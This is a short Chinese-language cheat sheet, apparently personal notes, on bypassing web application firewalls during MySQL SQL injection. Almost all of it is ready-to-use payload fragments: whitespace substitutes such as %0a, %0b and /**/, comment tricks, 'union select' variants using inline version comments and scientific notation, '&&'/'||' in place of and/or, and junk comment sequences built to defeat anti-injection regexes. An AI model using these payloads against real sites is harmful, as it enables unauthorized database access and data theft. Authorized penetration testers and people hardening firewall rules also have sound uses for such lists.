# mysql_bypass_waf_fuzz

---

教程：

```
https://www.jianshu.com/p/dd7ba834170e?from=singlemessage
```

技巧

字母大小写转换


空格：

```
%0a
/**/
+
//
```

---

注释符

```
--空格
#空格
-- +
/**/
```

绕过union select

```
union/*!12345select*/user()
union/**/select user()
union(select user())
```

绕过空格union和空格from

```
科学计数法：
id=1.1union select 1,2,3.1from user;
id=1e0union select 1,2,3e0from user;
id=1e1union select 1,2,3e1from user;
%0b，%0c：
id=1%0bunion select 1,2,3  =》id=1^Kunion select 1,2,3
id=1%0cunion select 1,2,3  =》id=1^Lunion select 1,2,3
```

select xx绕过

```
select@user()
select~user()
select!user()
select%0buser() => select^Kuser()
select%0cuser() => select^Luser()
```

id='2.0abc' 该字段为数字时，变成id=‘2‘

```
id=2.0abc'    -> id='2'
id=3.0abc'-1  -> id='2'
id=%201        -> id= 1
```

url传入ascii大于80时进行\x80编码 ：%80%81	

```
id=%80%81%82  -> id=\x80\x81\x82
```

函数与括号之间可添加空格、注释、换行

```
select user (),database/**/(),version
() from user;
```

执行语句之间空格绕过(注释/**/、换行%0a)

```
select/**/*/**/from
user;
```

单双引号'"、括号()、反单引号``、星号*、与语句之间可以没有空格

```
SELECT*FROM(users)WHERE(id='3.0abc')union(select'3.0abc',2,user()from`users`);
```

垃圾语句（当空格用）突破防sql注入的正则表达式(注释配合换行符)

```
--%20/*%99%0a
--%20%0d%0a%23/*%99%0a
%23/*%99%0a
```

and和or绕过

```
and -> &&  -> %26%26  
or  -> ||  -> %7C%7C
```

括号绕过

```
user() -> user(%0a /*!80000aaa*/)
```

